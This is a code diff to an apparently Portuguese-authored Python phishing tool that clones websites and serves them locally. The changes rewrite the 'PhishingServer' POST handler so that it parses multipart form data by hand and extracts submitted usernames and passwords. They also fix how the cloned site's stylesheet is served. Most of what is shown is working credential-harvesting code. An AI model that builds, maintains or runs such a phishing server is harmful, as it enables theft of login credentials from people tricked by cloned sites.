@@ -8,13 +8,14 @@ import time
 import webbrowser
 import requests
 import urllib.parse as urlparse
-import cgi
+from email.parser import BytesParser
+from email import policy
+from io import BytesIO
 from bs4 import BeautifulSoup
 from colorama import init, Fore, Style
 
 # Função para limpar a tela do console
 def clear_console():
-    """Clears the console screen."""
     os.system('cls' if os.name == 'nt' else 'clear')
 
 # Função para exibir a mensagem de boas-vindas
@@ -285,7 +286,7 @@ def clone_website(url, server_choice, language):
 
     except Exception as e:
         print(f"Error cloning website: {e}")
-        
+
 # Função para limpar os arquivos HTML e CSS
 def clean_up_files():
     try:
@@ -303,15 +304,12 @@ def run_local_server(target_url, language):
         print("Executando site de phishing em localhost...")
 
     class PhishingServer(http.server.BaseHTTPRequestHandler):
-        def __init__(self, *args, **kwargs):
-            super().__init__(*args, **kwargs)
-
         def do_GET(self):
             try:
                 if self.path == '/':
                     self.path = '/index.html'
                 elif self.path == '/styles.css':
-                    pass  # Lógica para servir o arquivo CSS
+                    self.path = '/styles.css'
 
                 with open(os.path.join('.', self.path[1:]), 'rb') as file:
                     self.send_response(200)
@@ -330,14 +328,20 @@ def run_local_server(target_url, language):
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length)
 
-            # Adicionar depuração para visualizar os dados recebidos
-            print("Received POST data:", post_data)
+            print("Received POST data:", post_data.decode('utf-8'))  # Para depuração
 
             if content_type.startswith('multipart/form-data'):
                 # Processar dados multipart/form-data
-                form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
-                username = form.getvalue('username', '')
-                password = form.getvalue('password', '')
+                boundary = content_type.split('boundary=')[1].encode()
+                parts = post_data.split(boundary)
+                for part in parts:
+                    if b'Content-Disposition' in part:
+                        headers, body = part.split(b'\r\n\r\n', 1)
+                        headers = headers.decode()
+                        if 'name="username"' in headers:
+                            username = body.split(b'\r\n')[0].decode()
+                        elif 'name="password"' in headers:
+                            password = body.split(b'\r\n')[0].decode()
             else:
                 # Processar dados application/x-www-form-urlencoded
                 post_data = post_data.decode('utf-8')
@@ -383,7 +387,7 @@ def run_local_server(target_url, language):
 
     except Exception as e:
         print(f"Error running local server: {e}")
-
+        
 # Função para informações de número de telefone
 def phone_number_info(language):
     clear_console()
